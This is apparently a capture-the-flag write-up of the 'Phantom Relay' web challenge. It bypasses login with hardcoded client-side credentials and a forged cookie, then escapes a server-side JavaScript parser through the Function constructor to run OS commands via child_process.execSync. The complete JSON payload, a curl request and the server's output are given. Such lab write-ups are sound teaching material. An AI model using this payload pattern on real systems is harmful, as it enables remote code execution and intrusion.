# **Phantom Relay CTF Writeup**

![image.png](attachment:be4befec-9045-4f86-b7aa-d7fc410026d5:image.png)

**the challenge to solve this were using Ai like gemini and antigravity google that has auto Ai doing the challenge as well**

![image.png](attachment:dd1c804c-6aaf-42cc-b288-445eb14a602c:image.png)

## **TL;DR**

The Phantom Relay challenge is a web exploitation challenge built using Next.js. Authentication is bypassed using hardcoded credentials found in the client-side JavaScript. The core vulnerability is a Server-Side JavaScript Sandbox Escape in the `/api/relay` endpoint, which features a custom instruction parser. We constructed an exploit that uses property walking and the pipeline's execution operator to reach the `Function` constructor and execute arbitrary OS commands to read the flag.

**Flag:** `hack10{ph4nt0m_r3l4y_3scap3d}`

---

## **1. Reconnaissance and Initial Access**

Navigating to the website, we are greeted with the "**Phantom Syndicate**" login page (`/login`), which asks for an "Access ID" and a "Passphrase".

Inspecting the client-side Javascript Next.js chunks (`_next/static/chunks/09d1-27o-77uy.js`), we found an internal incident report left by a developer detailing a fallback authentication tunnel.

```
text

[PORTAL_MEMO_INTERNAL]
To: All Provisioned Operators
From: Infra_Ops

Due to the recent rolling blackouts on the primary LDAP server, standard SSO
authentication is temporarily degraded. The fallback authentication tunnel
remains active.

If your access card is rejected, use the emergency administrative bypass
credential: 'phantom_op_88' with the standard 'admin' ID.
```

The script itself contains a hardcoded client-side check that sets an authentication cookie:

```
javascript

"admin"===a&&"phantom_op_88"===l?
    (document.cookie="phantom_auth=valid_session; path=/; max-age=3600",e.push("/dashboard"))
```

Because this is checked exclusively on the client, we were able to directly bypass login using the frontend login form with the credentials (`admin` / `phantom_op_88`) or by crafting our HTTP requests manually with the cookie `phantom_auth=valid_session`.

## **2. The Relay Pipeline**

Once inside, the dashboard links to a `/relay` interface for managing botnet infrastructure. According to the page text, strict payload sanitization has been enforced, and operators must select from predefined diagnostic routines.

Inspecting the Javascript for the relay page (`/_next/static/chunks/0nfecibteu-8f.js`), we uncover another internal memo regarding a recent security audit:

```
text

The relay UI has been locked down. The raw JSON input has been removed
from the interface. Operators must adhere to the three approved diagnostic
routines mapped in the selector.

I received the security audit regarding the reference engine resolving deep paths.
The auditor claimed that walking up the object tree could lead to an execution breakout.
This is theoretical nonsense. The $@X operator only takes the preceding index
as context and evaluates the target. It's fully sandboxed. Nobody can reach the
baseline runtime context just by passing weird strings into the array.
```

The UI submits POST requests to `/api/relay` with a JSON body shaped like:

```
json

{
"instructions": [
"PING_TEST",
"$0",
"NODE_ALIVE"
  ]
}
```

The API processes these arrays of instructions and returns the evaluated array as `results`.

## **3. Discovering the Sandbox Escape**

Our testing revealed two primary operators handled by the backend instruction engine:

1. **`$X` Property Resolution Engine:** When an instruction string begins with `$`, the parser splits the remainder by dots (`.`) and walks the property tree starting from `results[X]`. For example, `$0.length` accesses the `length` property of the element at index 0.
2. **`$@X` Execution Operator:** This operator corresponds to calling the target function located at `results[X]`. Crucially, we discovered through experimentation that the operator takes *the preceding index* in the results array as an argument and calls the function. Equivalent pseudocode: `results[X](results[X-1])`.

### **Walking the Object Tree**

As the auditor accurately pointed out, property path walking permits traversing upwards to the global JavaScript scope. By referencing a string primitive and walking up its constructors, we can procure the globally available `Function` constructor.

```
javascript

"".constructor.constructor===Function
```

In the payload context, if we have a string at index 0, placing `$0.constructor.constructor` at a subsequent index evaluates to the `Function` object!

Calling the `Function` constructor with a string argument allows parsing arbitrary strings as JavaScript code without relying on explicit `eval()` availability in the current scope.

## **4. Exploitation**

We can craft a payload combining these discoveries to achieve Remote Code Execution (RCE).

The goal is to call `Function("return process.mainModule.require('child_process').execSync('cat flag.txt').toString()")()` on the backend.

### **Vulnerable Code Execution Flow:**

1. **Index 0 `""`**: Base string to exploit the prototype chain in Step 3.
2. **Index 1 `"return process.mainModule..."`**: The Javascript payload. We will use this node as the argument passed to the `Function` constructor call.
3. **Index 2 `$0.constructor.constructor`**: The `$` operator retrieves the `Function` constructor object from the basic string located at index 0.
4. **Index 3 `$@2`**: Target index is `2` (`Function`). The preceding index is `1` (our payload string). We execute `Function(payload)`, which returns a newly instantiated `function anonymous() { <payload> }`. This new function is kept in the array at index `3`.
5. **Index 4 `$@3`**: To trigger our newly created function at index 3, we invoke the execution operator again. The target index is `3` (the anonymous function). The preceding index (2) is passed as an argument. The function fully evaluates and triggers inside the sandbox.

### **Final Payload**

```
json

{
"instructions": [
"",
"return process.mainModule.require('child_process').execSync('cat flag.txt').toString()",
"$0.constructor.constructor",
"$@2",
"$@3"
  ]
}
```

By submitting this JSON payload with `curl` using the `phantom_auth` cookie:

```
bash

curl-s-XPOSThttp://34.126.187.50:5510/api/relay\
-H"Content-Type: application/json"\
-b"phantom_auth=valid_session"\
-d'{"instructions":["","return process.mainModule.require(\"child_process\").execSync(\"cat flag.txt\").toString()","$0.constructor.constructor","$@2","$@3"]}'
```

The server response gives us the final execution output:

```
json

{
"success":true,
"results": [
"",
"return process.mainModule.require('child_process').execSync('cat flag.txt').toString()",
null,
null,
"hack10{ph4nt0m_r3l4y_3scap3d}\n"
  ]
}
```

---

Technical writeup 

## Phase 1: Initial Fuzzing & Hypothesis

We initially hypothesized that the `/api/relay` endpoint was vulnerable to Prototype Pollution (`__proto__`) leading to Server-Side Request Forgery (SSRF).

We sent several payloads attempting to pollute global objects to force an HTTP `GET` request:

<img width="997" height="307" alt="image" src="https://github.com/user-attachments/assets/b15258c8-14d3-4588-ba7c-7bedd4a6ed0d" />

**Result:** The server safely echoed the `__proto__` object back without executing the SSRF: `{"success":true,"results":[{"__proto__":{...}}]}`. The engine was strictly mirroring unhandled objects. We needed to change tactics and look at the source code.

---

## Phase 2: Reconnaissance & Authentication Bypass

We pulled the main index page to map the application routing and then started analyzing the static Next.js JavaScript chunks.

By grepping through the frontend chunks, we discovered an internal developer memo and hardcoded credentials:

<img width="1011" height="296" alt="image" src="https://github.com/user-attachments/assets/a1894f74-fc97-4b82-a067-0f2994cd2da0" />

**Discovery:**

> `credential: 'phantom_op_88' with the standard 'admin' ID.`
> 

Reviewing the surrounding code revealed that the authentication check was performed entirely on the client-side, minting a session cookie upon success:
`"admin"===a && "phantom_op_88"===l ? (document.cookie="phantom_auth=valid_session...`

We bypassed the frontend login portal by forging the expected cookie and successfully accessed the protected `/dashboard` endpoint:

<img width="1003" height="535" alt="image" src="https://github.com/user-attachments/assets/106beb85-2f4c-4954-8a6e-de4c557d6728" />

## Phase 3: Engine Mapping & Vulnerability Discovery

The dashboard pointed to the `/relay` botnet interface. We targeted its associated JavaScript chunk and grepped for security audit comments:

<img width="803" height="63" alt="image" src="https://github.com/user-attachments/assets/8848ad96-9028-4536-b253-2c60aaea53a2" />

**Discovery:**

> `The auditor claimed that walking up the object tree could lead to an execution breakout.`
> 

This leaked the existence of a custom backend parser at `/api/relay`. The parser used two specific operators:

1. **Property Resolver (`$X`):** Resolves the object at index `X` and allows dot-notation property access.
2. **Execution Operator (`$@X`):** Treats target index `X` as a function and executes it using the preceding index (`X-1`) as the argument.

The "execution breakout" warning confirmed the parser was vulnerable to **Prototype Traversal**. By using the `$X` resolver on a basic string, we could access `.constructor.constructor` to grab the global `Function` object, breaking out of the parser's intended sandbox.

## Phase 4: Exploitation (Sandbox Escape)

We crafted a 5-stage JSON array payload that bypasses the AST parser's strict sequential rules to compile and execute an OS command.

**The Target Command:** `return process.mainModule.require("child_process").execSync("cat flag.txt").toString()`

**The Exploit:**

<img width="1009" height="257" alt="image" src="https://github.com/user-attachments/assets/e034fa8d-7004-4931-81b5-0307d2613997" />

### Execution Flow Breakdown:

1. **`Index 0 ""`:** Instantiates a base string primitive.
2. **`Index 1 "return process..."`:** Loads the malicious OS command as dormant text.
3. **`Index 2 "$0.constructor.constructor"`:** The `$0` resolver looks at Index 0, walks up the prototype chain, and returns the global `Function` constructor.
4. **`Index 3 "$@2"`:** The Execution Operator targets Index 2 (`Function`) and calls it, passing Index 1 (our payload) as the argument. This compiles a new anonymous function in memory.
5. **`Index 4 "$@3"`:** The Execution Operator triggers again, calling the newly compiled function. The payload executes on the server, runs `cat flag.txt`, and returns the flag.

**Final Result:**

JSON

`{
  "success": true,
  "results": [
    "",
    "return process.mainModule.require(\"child_process\").execSync(\"cat flag.txt\").toString()",
    null,
    null,
    "hack10{ph4nt0m_r3l4y_3scap3d}\n"
  ]
}`
